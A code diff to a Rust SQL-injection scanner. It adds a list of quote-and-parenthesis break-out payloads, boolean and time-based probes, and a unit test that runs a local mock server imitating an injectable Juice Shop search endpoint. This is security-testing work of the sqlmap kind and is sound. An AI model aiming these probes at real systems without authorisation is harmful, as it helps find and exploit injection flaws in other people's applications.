@@ -21,6 +21,13 @@ struct InjectionPoint {
     label: String,
 }
 
+// SQL break-out contexts tried for error-based detection. A real injection point
+// only reveals itself when the payload closes the SURROUNDING context — Juice
+// Shop's product search is `LIKE '%q%'` inside double parens, so a bare `'` does
+// nothing but `'))` raises a syntax error. One generic payload misses these; trying
+// several unbalanced closers (the way sqlmap does) is what actually finds them.
+const SQLI_BREAKOUT_CONTEXTS: &[&str] = &["'", "')", "'))", "')))", "\"", "\")", "\"))", ")", "))", ")))"];
+
 /// Build the differential responses for one injection point and classify. Returns
 /// (injectable techniques, evidence) or None when the point could not be probed.
 fn sweep_probe_point(
@@ -64,17 +71,39 @@ fn sweep_probe_point(
         }))
     };
     let baseline = send("")?;
-    let error = send("'")?;
+    let base_err = sqli_db_error_present(&sqli_preview_lower(&baseline));
+    // Error-based: try each break-out context; the first that raises a DB error the
+    // clean baseline did not confirms an injectable context (and records which one).
+    let mut error_context: Option<String> = None;
+    let mut error_status = 0i64;
+    if !base_err {
+        for ctx in SQLI_BREAKOUT_CONTEXTS {
+            let Some(resp) = send(ctx) else { continue };
+            if sqli_db_error_present(&sqli_preview_lower(&resp)) {
+                error_context = Some((*ctx).to_string());
+                error_status = sqli_status(&resp);
+                break;
+            }
+        }
+    }
+    // Boolean / time as secondary (blind) signals, reusing the generic classifier
+    // but letting the multi-context result own error_based.
     let b_true = send("' AND '1'='1")?;
     let b_false = send("' AND '1'='2")?;
     let timed = send(sleep_payload)?;
-    let verdict = classify_sqli(&baseline, &error, &b_true, &b_false, &timed);
+    let generic = classify_sqli(&baseline, &baseline, &b_true, &b_false, &timed);
+    let verdict = SqliVerdict {
+        error_based: error_context.is_some(),
+        boolean_based: generic.boolean_based,
+        time_based: generic.time_based,
+    };
     let evidence = serde_json::json!({
         "point": point.label,
         "method": point.method,
         "url": point.url,
+        "errorContext": error_context,
         "baselineStatus": sqli_status(&baseline),
-        "errorStatus": sqli_status(&error),
+        "errorStatus": error_status,
         "falseStatus": sqli_status(&b_false),
         "timedMs": sqli_elapsed(&timed),
         "baselineMs": sqli_elapsed(&baseline),
@@ -271,6 +300,51 @@ mod attack_sweep_tests {
         assert_eq!(http_method("post"), reqwest::Method::POST);
         assert_eq!(http_method("PUT"), reqwest::Method::PUT);
         assert_eq!(http_method("weird"), reqwest::Method::GET);
+    }
+
+    #[test]
+    fn sweep_detects_breakout_context_sqli() {
+        // A Juice-Shop-style endpoint: injectable only when the payload closes the
+        // double-paren LIKE context (`'))`), not on a bare quote. Proves the
+        // multi-context sweep finds what a single generic payload misses.
+        use std::io::{BufRead, BufReader, Write};
+        use std::net::TcpListener;
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        std::thread::spawn(move || {
+            for stream in listener.incoming() {
+                let Ok(stream) = stream else { break };
+                let mut reader = BufReader::new(stream.try_clone().unwrap());
+                let mut line = String::new();
+                if reader.read_line(&mut line).is_err() {
+                    continue;
+                }
+                let raw = line.split_whitespace().nth(1).unwrap_or("");
+                // Encoded `))` present and not commented out -> unbalanced -> DB error.
+                let (status, body) = if raw.contains("%29%29") && !raw.contains("--") && !raw.contains("%2D%2D") {
+                    ("500 Internal Server Error", "Error: SQLITE_ERROR: near \")\": syntax error")
+                } else {
+                    ("200 OK", "{\"status\":\"success\",\"data\":[]}")
+                };
+                let mut s = stream;
+                let _ = write!(s, "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
+            }
+        });
+        let client = reqwest::blocking::Client::builder()
+            .timeout(Duration::from_secs(5))
+            .build()
+            .unwrap();
+        let point = InjectionPoint {
+            method: "GET".into(),
+            url: format!("http://127.0.0.1:{port}/rest/products/search?q=apple"),
+            body_field: None,
+            base_body: None,
+            query_param: Some("q".into()),
+            label: "GET /rest/products/search?q".into(),
+        };
+        let (verdict, ev) = sweep_probe_point(&client, &point, SQLI_SLEEP_PROBES[0].payload).unwrap();
+        assert!(verdict.error_based, "must detect error-based via a break-out context: {ev}");
+        assert_eq!(ev.get("errorContext").and_then(|v| v.as_str()), Some("'))"));
     }
 
     #[test]
